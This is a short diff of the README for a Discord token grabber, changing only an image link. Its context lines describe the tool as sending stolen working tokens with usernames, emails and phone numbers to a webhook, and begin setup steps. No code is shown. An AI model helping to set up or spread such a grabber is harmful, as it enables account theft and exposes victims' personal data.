@@ -10,7 +10,7 @@ This version of the grabber only supports **Windows**.
  - Only sends working tokens along with username, email and phone
 
 <br>
-![image](https://user-images.githubusercontent.com/43907678/106658358-2e9cfb00-65c3-11eb-9dfd-e017f9704e5e.png)
+![image](https://github.com/quiet69/Discord-Token-Grabber/blob/master/106658358-2e9cfb00-65c3-11eb-9dfd-e017f9704e5e.png)
 
 # How to use
  1. Create a webhook on your Discord server.
